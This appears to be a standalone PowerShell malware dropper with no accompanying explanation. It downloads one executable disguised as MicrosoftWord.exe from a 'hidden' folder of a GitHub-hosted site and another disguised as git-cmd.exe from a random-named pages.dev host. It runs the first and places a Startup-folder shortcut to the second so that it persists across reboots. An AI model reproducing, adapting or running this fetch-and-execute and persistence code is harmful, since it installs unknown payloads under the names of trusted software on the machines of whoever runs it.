$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
$folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
$localPath = "$folderPath\MicrosoftWord.exe"

if (-Not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath
}

Invoke-WebRequest -Uri $url -OutFile $localPath

$destination = "$env:LOCALAPPDATA\Git\git-cmd.exe"
$binFolder = "$env:LOCALAPPDATA\Git\bin"

$folder = Split-Path -Path $destination
if (-not (Test-Path -Path $folder)) {
    New-Item -ItemType Directory -Path $folder
}

Invoke-WebRequest -Uri "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/Git/git-cmd.exe" -OutFile $destination

if (-not (Test-Path -Path $binFolder)) {
    New-Item -ItemType Directory -Path $binFolder
}

Start-Process $localPath

$WshShell = New-Object -ComObject WScript.Shell
$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$Shortcut = $WshShell.CreateShortcut("$StartupFolder\GitCmd.lnk")
$Shortcut.TargetPath = $destination
$Shortcut.Save()
